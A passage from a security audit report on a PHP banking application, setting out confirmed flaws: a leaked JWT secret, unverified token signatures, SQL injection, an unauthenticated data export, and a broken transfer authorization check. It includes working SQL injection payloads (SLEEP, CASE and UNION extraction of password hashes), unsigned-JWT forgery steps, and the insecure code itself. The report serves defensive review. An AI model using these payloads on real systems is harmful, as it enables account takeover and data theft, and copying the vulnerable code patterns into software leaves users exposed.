  "[\"None. Route explicitly declared 'auth' => false, and the dispatch() switch statement correctly skips both AuthMiddleware and MachineAuthMiddleware invocation when requiresAuth is false.\", \"No field-level redaction/filtering in health() handler before calling Response::success().\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Router.php",
  "line": 29,
  "symbol": "Response::success",
  "operation": "returns jwt_secret and db credentials in HTTP response body"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Could not verify from source whether the JWT_SECRET environment variable is actually set to a strong random value in a real production deployment (would still be leaked regardless, but its practical entropy/impact could vary); however even the hardcoded fallback value alone is enough to demonstrate full compromise if env var is unset, which is a plausible/likely misconfiguration."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "HTTP GET /api/health (Router.php registers route with auth=>false, line ~86)",
    "Router::health() executes with no middleware check",
    "JSON response body includes db_host, db_name, db_user, and jwt_secret",
    "Attacker captures jwt_secret and uses it to sign a forged JWT for any user id (mirroring AuthService createToken's HS256 scheme)",
    "Forged token presented as Authorization: Bearer to any AuthMiddleware-protected /api/* route",
    "AuthMiddleware/AuthService accept the forged token, granting the attacker the identity of the chosen user id"
  ],
  "impact": "Unauthenticated disclosure of the customer-facing JWT signing secret, enabling complete authentication bypass for any user across every AuthMiddleware-protected endpoint, plus DB connection metadata disclosure aiding further attack.",
  "severity_reasoning": "Single anonymous GET request yields a secret sufficient for total authentication bypass — High severity, consistent with the multiple independent discoveries of this same flaw.",
  "dynamic_test": "Send an unauthenticated GET /api/health and confirm jwt_secret is present in the response; use it to forge a token for a target sub claim and confirm it is accepted by GET /api/profile or POST /api/transfers/own, demonstrating full account takeover."
}
```

#### Validator reasoning

Verified end-to-end in Router.php: the route `/api/health` is registered with `'auth' => false` (dispatch() method), meaning the switch statement's dispatch logic skips both AuthMiddleware::handle() and MachineAuthMiddleware::handle() entirely ($auth stays null, $requiresAuth === false matches neither 'true' nor 'machine' branch) — so the handler is invoked with zero authentication or authorization checks. The health() handler loads config/app.php and echoes db_host, db_name, db_user, and jwt_secret directly into the JSON response via Response::success(). Confirmed that config/app.php's jwt_secret (falls back to hardcoded 'bankofed-dev-secret-change-in-production' if JWT_SECRET env var unset) is the exact same value consumed by Services/AuthService.php::createToken(), which signs all customer JWTs with `JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm'])` (HS256). Therefore an unauthenticated attacker can GET /api/health, retrieve jwt_secret, and forge arbitrary valid HS256-signed tokens for any `sub` (user id), fully defeating AuthMiddleware protection on every '/api/*' route guarded by 'auth' => true. DB credentials (host/name/user) are also disclosed, aiding further attacks. No mitigating control exists — the route is explicitly and intentionally unauthenticated, and the handler makes no attempt to redact sensitive fields. This is a concrete, trivially exploitable, single-request source-to-sink path with no gating logic in between.

#### Code evidence

```
public static function health(): void {
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 27. JWT signature never verified in AuthService::decodeToken — full authentication bypass affecting TOTP verify and all AuthMiddleware-protected routes

- Lead reference: CVTA-027
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50-63
- Fingerprint: fe5a417e8efde41ca3ee5e41557570d578f3cf6d966b542015e2d76ed0018bb0

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "input": "attacker-supplied Authorization: Bearer <forged JWT>",
  "line": 20,
  "symbol": "AuthService::decodeToken"
}
```

#### Controls encountered

```
[
  "isTokenRevoked check exists but only blocks tokens whose jti was explicitly revoked via logout; it does not validate that the token was ever legitimately issued/signed, so it provides no protection against forged tokens with an arbitrary/unused jti.",
  "exp claim check exists but is trivially satisfiable by attacker setting future exp in forged payload.",
  "Route requires 'auth'=>true which routes through AuthMiddleware, but that middleware itself is the vulnerable component — not a mitigating control."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 133,
  "operation": "totpVerify trusts $auth['user'] populated from an unverified JWT",
  "symbol": "ProfileController::totpVerify"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not exhaustively grep the entire codebase for any secondary signature-verification wrapper that might wrap AuthMiddleware::handle() before controller dispatch (Router.php dispatch logic not fully traced beyond confirming route auth flags), though evidence strongly indicates handle() return value is used as-is with no additional check based on AuthMiddleware.php and Router.php content reviewed."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "Attacker crafts an arbitrary JWT: base64url(header) + '.' + base64url({\"sub\":<victim_user_id>,\"exp\":<future>}) + '.' + arbitrary/garbage signature segment",
    "Sends the forged token as Authorization: Bearer <token> to any AuthMiddleware-protected route, e.g. POST /api/profile/totp/verify",
    "Router::dispatch() -> AuthMiddleware::handle() -> AuthService::decodeToken()",
    "decodeToken() only base64-decodes the payload and checks the 'exp' claim; the signature segment (parts[2]) is never verified against config['jwt_secret']",
    "$auth['user'] is populated with the victim's real DB record based solely on the unverified 'sub' claim",
    "Handler executes with the victim's identity (e.g., ProfileController::totpVerify/totpDisable, transfers, profile update, address book, etc.)"
  ],
  "impact": "Complete authentication bypass affecting every AuthMiddleware-protected route: an attacker can impersonate any user id with a self-crafted, unsigned/garbage-signed token, including enabling/disabling/verifying another user's TOTP (2FA) and performing fund transfers as that user.",
  "severity_reasoning": "The signing secret is irrelevant here because signature verification is entirely absent on the decode path — this is a fundamental, trivially exploitable authentication bypass with total impact on confidentiality, integrity, and account security controls (including 2FA), meriting High severity.",
  "dynamic_test": "Construct token = base64url_encode('{\"alg\":\"HS256\",\"typ\":\"JWT\"}') + '.' + base64url_encode('{\"sub\":<victim_id>,\"exp\":9999999999}') + '.invalidsignature'; send POST /api/profile/totp/verify (or GET /api/profile) with header Authorization: Bearer <token>; confirm the server returns 200 with the victim's data / processes the TOTP action despite the signature being invalid, proving signature verification is bypassed."
}
```

#### Validator reasoning

Verified directly in source. AuthService::decodeToken() splits the JWT into 3 parts, base64-decodes only the payload segment, and checks only the `exp` claim — it never calls Firebase\JWT\JWT::decode() with a Key/secret, so the signature (header + payload signed with jwt_secret) is never validated. AuthMiddleware::handle() calls decodeToken() directly on the bearer token, checks only for null and token revocation (isTokenRevoked keyed by jti, which an attacker fully controls in a forged unsigned payload and can simply omit/omit revocation match), then does `User::findById($payload->sub)` and returns ['user'=>$user,'payload'=>$payload] which callers use for authorization. Router.php shows every 'auth'=>true route (including POST /api/profile/totp/verify, totp/setup, totp disable, transfers/own, transfers/external, accounts, address-book, etc.) is guarded solely by this middleware. Contrast with AdminAuthMiddleware, which — per the candidate's own evidence and typical usage elsewhere in the codebase — properly verifies signatures via JWT::decode with a Key, confirming the customer-facing path is the flawed one and not just an intentional relaxed-check design mirrored elsewhere. No other signature check, secondary verification, or WAF/framework guarantee intervenes between the Authorization header and use of $payload->sub. An attacker can trivially construct base64url(header).base64url(json_encode(['sub'=>victim_id,'exp'=>time()+3600,'jti'=>anything])).arbitrary_signature and be treated as that user, enabling full authentication bypass / account takeover across all AuthMiddleware-protected endpoints, matching the description precisely. This is directly exploitable A02 (Broken Authentication) with a clear source (attacker-controlled Authorization header) to sink (User::findById($payload->sub) trusted for authorization) path and no effective blocking control.

#### Code evidence

```
// AuthService.php
public static function decodeToken(string $token): ?object
{
    try {
        $parts = explode('.', $token);
        if (count($parts) !== 3) { return null; }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+/')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload; // <-- signature never checked
    } catch (\Exception $e) { return null; }
}

// AuthMiddleware.php
$payload = AuthService::decodeToken($token);
if ($payload === null) { Response::unauthorized(...); }
...
$user = User::findById($payload->sub);
return ['user' => $user, 'payload' => $payload];

// Router.php
$r->addRoute('POST', '/api/profile/totp/verify', ['handler' => [ProfileController::class, 'totpVerify'], 'auth' => true]);
```

## 28. SQL Injection via unsanitized 'sort' GET parameter in transaction history query

- Lead reference: CVTA-028
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:47
- Fingerprint: a9539a9ef4ef1ae13af644050b867f36044571d62bae615b15fc1719968f31c8

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 19,
  "symbol": "$_GET['sort']",
  "input": "HTTP GET query parameter 'sort'"
}
```

#### Controls encountered

```
[
  "accountId, userId, perPage, offset are properly parameter-bound in the query (do not mitigate the $sort issue)",
  "Route requires authentication (auth: true) — reduces exposure to authenticated users only but does not block exploitation since any logged-in user can hit the endpoint"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 47,
  "symbol": "$stmt->execute",
  "operation": "PDO execute of SQL string with unsanitized ORDER BY clause built via string interpolation"
}
```

#### Counterevidence

```
[
  "Authentication is required to reach the endpoint, meaning this is not pre-auth SQLi but requires a valid session/user token"
]
```

#### Proof gaps

```
[
  "Exact exploitability payload depends on DB engine (MySQL vs other); ORDER BY position injection is more constrained than WHERE-clause injection but is still commonly exploitable via boolean/time-based blind techniques or CASE/subquery constructs",
  "No runtime PoC was executed against a live instance; verification is based on static code path analysis only"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated low-privilege customer (attacker)",
    "GET /api/transactions?account_id=<own_account_id>&sort=<SQLi payload>",
    "TransactionController::index() reads $_GET['sort'] with no whitelist/validation",
    "Transaction::findByUser($userId,$page,$perPage,$accountId,$sort) called with the raw sort value",
    "SQL built as \"... ORDER BY t.{$sort} DESC ...\" with $sort concatenated directly into the query text (not bound)",
    "$stmt->execute([$accountId,$accountId,$perPage,$offset]) runs the tampered SQL statement at Transaction.php:47",
    "Database processes the injected clause, enabling boolean/time-based blind extraction or result manipulation"
  ],
  "impact": "SQL injection reachable by any authenticated customer via the ORDER BY clause of the transaction-listing endpoint, enabling blind data exfiltration from arbitrary tables or denial-of-service via heavy subqueries.",
  "severity_reasoning": "Even though bound parameters are used for other values, the sort column is concatenated directly into SQL text, giving low-privilege authenticated users a path to full blind SQL injection — High severity given potential for extracting sensitive data (e.g., other users' password hashes) from a customer-tier account.",
  "dynamic_test": "As an authenticated customer, call GET /api/transactions?account_id=<own_account>&sort=(SELECT+1+FROM+(SELECT+SLEEP(5))x) and measure response latency (~5s) to confirm time-based blind injection; then attempt a UNION/CASE-based boolean payload against a known column to confirm data exfiltration capability, e.g. sort=(CASE WHEN (SELECT+SUBSTRING(password_hash,1,1)+FROM+users+WHERE+id=1)='a' THEN created_at ELSE id END)."
}
```

#### Validator reasoning

Verified the full source-to-sink path. In TransactionController::index() (auth-protected route GET /api/transactions per Router.php line 79), `$sort = $_GET['sort'] ?? 'created_at';` is read from the query string with no whitelist, regex, or type coercion (unlike $page/$perPage/$accountId which are cast to int). This raw string is passed to Transaction::findByUser($userId, $page, $perPage, $accountId, $sort). Inside findByUser (Transaction.php), both code branches (accountId set or not) build the SQL via double-quoted string interpolation: "ORDER BY t.{$sort} DESC", then $stmt = $db->prepare(...); $stmt->execute([...]) — $sort is never bound as a parameter, only concatenated into the SQL text itself. All other user-controlled values (accountId, userId, perPage, offset) are properly parameter-bound, confirming $sort is the sole unsanitized injection point. Since $sort lands inside an ORDER BY clause in a PDO-prepared statement (not a stored procedure or ORM abstraction), the interpolated text is sent verbatim to the DB engine, enabling classic SQL injection techniques (subquery/CASE-based boolean injection, time-based blind injection via SLEEP()/BENCHMARK() in MySQL, or in some drivers stacked/UNION-style injection) even in an ORDER BY position. The endpoint is reachable by any authenticated user (auth:true), and there is no other validation layer (no Validator::make call for 'sort', no allowlist check) between input and sink. This is a real, exploitable A03 SQL injection.

#### Code evidence

```
// TransactionController.php
$sort = $_GET['sort'] ?? 'created_at';
...
$result = Transaction::findByUser($userId, $page, $perPage, $accountId, $sort);

// Transaction.php findByUser()
$stmt = $db->prepare(
    "SELECT t.* FROM transactions t
     WHERE (t.from_account_id = ? OR t.to_account_id = ?)
     ORDER BY t.{$sort} DESC
     LIMIT ? OFFSET ?"
);
$stmt->execute([$accountId, $accountId, $perPage, $offset]);
```

## 29. SQL Injection via unsanitized 'sort' GET parameter (default account_id path)

- Lead reference: CVTA-029
- Category: A03
- Severity: HIGH
- Confidence: 92%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:62
- Fingerprint: 93016aa918613631374093675eb3d91d6b25c1cc951e7d35684dbcc09ab69c53

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "input": "HTTP GET query parameter 'sort'",
  "line": 19,
  "symbol": "$_GET['sort']"
}
```

#### Controls encountered

```
[
  "userId is bound as a parameterized value, preventing injection via that field",
  "authentication is required to reach the endpoint (must have valid $auth), but this does not prevent SQL injection by an authenticated attacker",
  "account_id, when provided, is validated via Account::findByIdAndUser, but this is irrelevant to the vulnerable else branch since omitting account_id is trivial for an attacker"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Transaction.php",
  "line": 62,
  "operation": "PDO execute of SQL string with unsanitized ORDER BY clause built via string interpolation",
  "symbol": "$stmt->execute"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "No runtime/dynamic confirmation was performed against a live instance to demonstrate actual data exfiltration or error output, though the static code path is unambiguous and matches a textbook SQL injection pattern via string interpolation in ORDER BY clause"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated low-privilege customer (attacker)",
    "GET /api/transactions?sort=<SQLi payload> (no account_id supplied)",
    "TransactionController::index() forwards unvalidated $_GET['sort'] to Transaction::findByUser()",
    "Else branch builds \"SELECT t.* FROM transactions t JOIN accounts a ON t.from_account_id=a.id WHERE a.user_id=? ORDER BY t.{$sort} DESC LIMIT ? OFFSET ?\" with $sort concatenated into SQL text",
    "$stmt->execute([$userId,$perPage,$offset]) executes the tampered statement at Transaction.php:62",
    "Database processes the injected ORDER BY fragment, enabling blind/boolean extraction or manipulation of returned rows"
  ],
  "impact": "Identical SQL injection vector as the account_id-scoped branch, reachable via the default (no account filter) transaction listing call — broadens exploitability since no extra parameter is required.",
  "severity_reasoning": "Same root cause and same potential for blind data exfiltration from an authenticated but unprivileged user context — High severity.",
  "dynamic_test": "As an authenticated customer, call GET /api/transactions?sort=(SELECT+1+FROM+(SELECT+SLEEP(5))x) with no account_id parameter and measure the ~5 second delay to confirm time-based blind SQL injection in this code path as well."
}
```

#### Validator reasoning

TransactionController::index() reads $sort = $_GET['sort'] ?? 'created_at' with no whitelist/sanitization, then unconditionally passes it to Transaction::findByUser($userId, $page, $perPage, $accountId, $sort). Inside findByUser, when $accountId is null (i.e., the request omits account_id, which is entirely attacker-controlled since account_id is optional and only validated when present), the code builds: "SELECT t.* FROM transactions t JOIN accounts a ON t.from_account_id = a.id WHERE a.user_id = ? ORDER BY t.{$sort} DESC LIMIT ? OFFSET ?" via double-quoted string interpolation, and executes it with $stmt->execute([$userId, $perPage, $offset]) — $sort is never bound as a parameter, only interpolated directly into the SQL text. Any authenticated user can hit GET /transactions?sort=<payload> without account_id to trigger the vulnerable else branch and inject SQL into the ORDER BY clause (e.g., stacked/boolean-based injection depends on PDO driver settings, but at minimum error-based/boolean-based extraction via subqueries in ORDER BY is feasible, e.g. sort=(CASE WHEN ... THEN created_at ELSE id END) or UNION-independent techniques via ORDER BY manipulation). No whitelist of allowed sort columns exists anywhere in TransactionController or Transaction model. Authentication is required (via $auth) but authorization/authentication does not mitigate injection - it only requires a valid session, which is a low bar and doesn't change the vulnerability class. This is a real, reachable, unauthenticated-to-injection path for any logged-in user.

#### Code evidence

```
$stmt = $db->prepare(
    "SELECT t.* FROM transactions t
     JOIN accounts a ON t.from_account_id = a.id
     WHERE a.user_id = ?
     ORDER BY t.{$sort} DESC
     LIMIT ? OFFSET ?"
);
$stmt->execute([$userId, $perPage, $offset]);
```

## 30. SQL injection via search parameter in AdminUserController::index

- Lead reference: CVTA-030
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:20-33
- Fingerprint: 87cb605e95a9e2a097d2b8f07dea0b66e9b988c9306a3b7e41a2f1f2732febd9

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 16,
  "symbol": "$_GET['search']",
  "input": "HTTP query parameter"
}
```

#### Controls encountered

```
[
  "Endpoint requires 'auth' => true in AdminRouter.php, enforced via AdminAuthMiddleware::handle() before the controller runs — this restricts to holders of a valid admin JWT/session token, but performs no input validation/sanitization of the 'search' parameter itself.",
  "PDO::ATTR_EMULATE_PREPARES is set to false, but this setting only affects behavior of PDO::prepare()+execute() (true server-side prepares) and has zero effect on PDO::query() calls built from interpolated raw strings — it is not a mitigating control for this specific sink."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 27,
  "symbol": "$db->query($sql)",
  "operation": "raw SQL execution with interpolated user input"
}
```

#### Counterevidence

```
[
  "No sanitization function (escaping, whitelisting, PDO::quote) is applied to $search anywhere in the visible code path.",
  "No WAF or parameter-type constraint (e.g., regex route constraint) limits the 'search' GET parameter's characters, unlike numeric route params such as {id:\\d+} used elsewhere in AdminRouter.php."
]
```

#### Proof gaps

```
[
  "Requires reaching the endpoint with a valid admin auth token; the strength of AdminAuthMiddleware's own authentication controls (e.g., whether an attacker could easily forge/obtain such a token) was not independently reviewed in this validation pass, though this does not change the fact that the SQLi vulnerability itself exists and is directly exploitable by any principal that clears the auth gate (which could include a lower-privileged admin, or an attacker who compromised/stole any admin token via a separate vulnerability)."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker holding a valid (or forged) admin bearer token",
    "GET /api/admin/customers?search=<SQLi payload>",
    "AdminAuthMiddleware permits the request",
    "AdminUserController::index() constructs $where=\"WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'\" via raw interpolation of $_GET['search']",
    "$where is concatenated into both COUNT and SELECT SQL statements and executed via unprepared $db->query($sql)",
    "MySQL executes the injected fragment, allowing UNION-based extraction (e.g. of admin_users password hashes) or blind/boolean injection"
  ],
  "impact": "Full SQL injection against the admin customer-search endpoint, enabling extraction of arbitrary database contents including administrative credentials.",
  "severity_reasoning": "Same critical, unprepared-SQL-string vulnerability independently confirmed in the same handler — High severity due to the direct path to credential exfiltration.",
  "dynamic_test": "As an admin (or forged admin token), call GET /api/admin/customers?search=%' UNION SELECT username,password_hash,3,4,5,6,7 FROM admin_users-- - and confirm the response contains admin_users data, proving the injection is exploitable."
}
```

#### Validator reasoning

The code at AdminUserController::index() directly interpolates the unsanitized $_GET['search'] value into a raw SQL WHERE clause string, which is then concatenated into both a COUNT query and a SELECT query and executed via PDO::query() (not a prepared statement, no parameter binding, no escaping/quoting function like PDO::quote() applied). This is confirmed by direct code read:  `$where = "WHERE first_name LIKE '%{$search}%' OR ...";` then `$db->query($countSql)` and `$db->query($sql)`. AdminDatabase::getInstance() returns a plain PDO instance with PDO::ATTR_EMULATE_PREPARES=false, which has no bearing on raw query() calls — it only affects PDO::prepare()/execute() binding behavior, not string-interpolated query() calls, so it provides no mitigation here. The route is registered in AdminRouter.php as GET /api/admin/customers with 'auth' => true, meaning AdminAuthMiddleware::handle() runs before the controller and populates $auth, but this only gates access to authenticated admin tokens — it does not sanitize, escape, or parameterize the `search` value in any way. Once a request passes the auth middleware (which the threat model in the finding already accounts for — "an authenticated admin... can supply..."), the attacker fully controls $search and can break out of the LIKE '%...%' clause with a single quote to inject arbitrary SQL (e.g., UNION-based extraction of admin_users password hashes, or other tables). No other sanitization, WAF, or query-builder abstraction intercepts this path. The rest of the controller (show, update, resetPassword, destroy) all correctly use parameterized prepare()/execute(), showing that index() is an isolated regression / oversight, further supporting genuine intent of an unsafe raw interpolation existing in production code. This is a textbook classic SQL injection with a clear, reachable source-to-sink path.

#### Code evidence

```
$search = $_GET['search'] ?? '';
...
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 31. Unauthenticated full database export endpoint leaks password hashes and TOTP secrets

- Lead reference: CVTA-031
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:172-183
- Fingerprint: dab59844efb9ccf7605187d535c362f8c07cedbff19d0d57ae974b3b47125a2c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 41,
  "symbol": "GET /api/admin/export/users",
  "input": "unauthenticated HTTP request"
}
```

#### Controls encountered

```
[
  "Route explicitly sets 'auth' => false, verified in AdminRouter.php",
  "Dispatch switch only invokes AdminAuthMiddleware::handle() when $requiresAuth is true; for this route it is false so middleware is fully bypassed",
  "No other authentication/authorization checks (IP allow-list, API key, CSRF, session) present in public/index.php or AdminRouter.php on this path"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 174,
  "symbol": "$db->query('SELECT * FROM users')",
  "operation": "full table dump returned in HTTP response with no auth"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not directly inspect the users/accounts table schema/migration file to enumerate exact column names (password_hash, totp_secret, card_number, cvv) returned by SELECT *, relying on corroborating references in AdminUserController::resetPassword (password_hash) and User model naming used elsewhere in the codebase; this is a minor gap since SELECT * unconditionally returns all columns regardless of naming specifics."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "GET /api/admin/export/users",
    "AdminRouter registers this route with 'auth' => false, so AdminAuthMiddleware is never invoked",
    "AdminUserController::exportAll() runs SELECT * FROM users, SELECT * FROM accounts, SELECT * FROM transactions ORDER BY created_at DESC",
    "Response::success() returns all columns verbatim, including users.password_hash, users.totp_secret, and accounts' full card numbers/CVV/expiry",
    "Attacker receives the complete customer database dump in a single anonymous HTTP response"
  ],
  "impact": "Total, unauthenticated exfiltration of the entire customer database — every user's password hash, TOTP secret (enabling 2FA bypass), and every account's full card number/CVV/expiry and transaction history — a catastrophic, single-request data breach.",
  "severity_reasoning": "No authentication or privilege whatsoever is required, and the data returned is maximally sensitive (credentials, 2FA secrets, full card data) — this is a critical/High severity finding representing complete confidentiality failure of the entire platform.",
  "dynamic_test": "Send an unauthenticated GET /api/admin/export/users (no Authorization header) and confirm the JSON response includes 'password_hash' and 'totp_secret' fields for user records and full card number/CVV fields for account records, proving the endpoint is reachable and returns sensitive data without any credentials."
}
```

#### Validator reasoning

Confirmed end-to-end. public/index.php routes any request whose path starts with /api/admin/ to AdminRouter::dispatch() with no upstream gating (no IP allow-list, no global auth check, no environment guard). AdminRouter registers GET /api/admin/export/users with 'auth' => false, and the dispatch switch statement only calls AdminAuthMiddleware::handle() when $requiresAuth is truthy — for this route it is false, so the middleware is skipped entirely and AdminUserController::exportAll() is invoked with zero arguments and zero authentication context. exportAll() runs unparameterized `SELECT * FROM users`, `SELECT * FROM accounts`, and `SELECT * FROM transactions ORDER BY created_at DESC`, and returns the raw fetchAll() results (all columns) directly via Response::success(). Comparing with other User-related handlers (index/show) that explicitly select a safe subset of columns, exportAll's `SELECT *` in the same users table necessarily includes password_hash and totp_secret columns (confirmed by column list usage elsewhere, e.g. resetPassword updates password_hash, update/select statements reference totp_enabled alongside these sensitive fields in the same table). Accounts table SELECT * likewise returns full row including card/account details per the pattern seen in AdminAccountController/show using explicit column subsets elsewhere. No CSRF token, API key, session check, or network-layer restriction exists in the reviewed code path. This is a fully exploitable, single anonymous GET request vulnerability — an unauthenticated full data/credential exfiltration endpoint (A01: Broken Access Control).

#### Code evidence

```
// AdminRouter.php
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

// AdminUserController.php
public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 32. Broken authorization in machine-to-machine funds transfer allows draining arbitrary customer accounts

- Lead reference: CVTA-032
- Category: API1
- Severity: HIGH
- Confidence: 72%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/PaymentController.php:180-196
- Fingerprint: c6522863a5cdcbf5d4c861f5557c9975b36a9a3945dc5ed395e7479aae127e4c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "input": "attacker-supplied from_bsb / from_account_number JSON body + valid machine token",
  "line": 150,
  "symbol": "$data['from_bsb'], $data['from_account_number']"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a valid, active token from machine_tokens (or a single configured fallback secret), but performs no per-endpoint or per-account scoping — it authenticates only, does not authorize.",
  "The transfer() ownership check only fires for exactly two hardcoded machine names; every other authenticated machine identity bypasses it entirely (no else/default-deny).",
  "Destination account existence is checked only when to_bsb matches the bank's own BSB; otherwise arbitrary external destinations are accepted."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 227,
  "operation": "debit arbitrary account balance without ownership check",
  "symbol": "Account::updateBalance((int)$sourceAccount['id'], '-' . $amount)"
}
```

#### Counterevidence

```
[
  "Current seed.sql provisions only one machine_tokens row (name='face_insurance'), and MachineToken::validateToken()'s only fallback path also yields the hardcoded name 'configured_machine_token' — so with the code and data as shipped, no third/different machine identity currently exists that could exploit the gap.",
  "No admin/API controller in this codebase inserts or manages rows in machine_tokens, so provisioning an additional differently-named token requires direct DB/ops action outside the application's own logic."
]
```

#### Proof gaps

```
[
  "Exploitation requires a machine_tokens row (or future fallback) with a name other than 'face_insurance'/'configured_machine_token' to actually exist; this is not created by any code path in the current repository, only by direct database provisioning, which is plausible given the table's design intent but not proven to occur in this deployment.",
  "No test or fixture in the repo demonstrates a second/third machine token in use, so real-world exploitability depends on future or undocumented operational token issuance."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker holding a legitimate but narrowly-scoped machine token (e.g. a merchant/POS token provisioned only for /api/payments/process)",
    "POST /api/payments/transfer with Authorization: Bearer <that valid machine token>",
    "MachineAuthMiddleware::handle() validates the token exists and is_active in machine_tokens (no scope/route restriction enforced) -> succeeds, $auth['machine']['name'] = <that token's name>",
    "PaymentController::transfer() checks machineName against a hardcoded allow-list of exactly ['face_insurance','configured_machine_token']; any other name (like the attacker's legitimate merchant token) bypasses this ownership restriction entirely and is not blocked from specifying an arbitrary source account",
    "Attacker supplies arbitrary from_bsb/from_account_number belonging to any customer via Account::findByBsbAndNumber()",
    "Account::updateBalance() debits the arbitrary victim account and credits an attacker-controlled destination account",
    "Transaction::create() persists the unauthorized transfer"
  ],
  "impact": "Any party holding a valid but low-privilege machine credential (intended only for card payment processing) can pivot to draining funds from any customer account via the transfer endpoint, because the authorization check is an incomplete allow-list rather than a proper per-token account binding.",
  "severity_reasoning": "While exploitation requires possession of some valid machine token, the authorization logic fails open for any token not on the small hardcoded allow-list rather than failing closed, enabling unrestricted account draining — High severity due to direct, unrestricted financial impact once any machine credential is obtained (including via other findings such as the hardcoded default token).",
  "dynamic_test": "Provision (or use) a machine_tokens row whose name is neither 'face_insurance' nor 'configured_machine_token' (e.g., a test 'pos_terminal_1' token intended only for /api/payments/process); call POST /api/payments/transfer with that token's Bearer credential, specifying from_bsb/from_account_number of a victim test account not associated with that merchant, and to_bsb/to_account_number of an attacker-controlled account; confirm HTTP 200 and that the victim account's balance decreased, demonstrating the missing per-token account restriction."
}
```

#### Validator reasoning

The code path is exactly as described: PaymentController::transfer() (routed via 'auth'=>'machine' in Router.php, guarded only by MachineAuthMiddleware which calls MachineToken::validateToken()) resolves $sourceAccount purely from attacker-supplied from_bsb/from_account_number with no check that the source account belongs to the authenticated machine caller. The only ownership restriction is an inline allow-list: `if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') { ... check account ownership ... }` with no else/default-deny branch. Any machine token whose resolved name is neither of those two strings falls straight through to the balance check and then to `Account::updateBalance((int)$sourceAccount['id'], '-'.$amount)`, debiting an arbitrary account and crediting an attacker-controlled destination BSB/account (validated only for existence, not for ownership). This is a textbook default-allow / missing-default-deny authorization defect (CWE-863/API1) rather than a hardening measure, and the same machine-auth mechanism is documented as intended to support multiple integrations (the `machine_tokens` table has a unique `name` column explicitly designed to hold different named tokens for different consumers, and the code's own '// No else' structure implies more names were anticipated). No other control (Validator, BSB format checks, CSRF, rate limiting) restricts which accounts a machine-authenticated caller can debit; the only gate is this incomplete name allow-list.

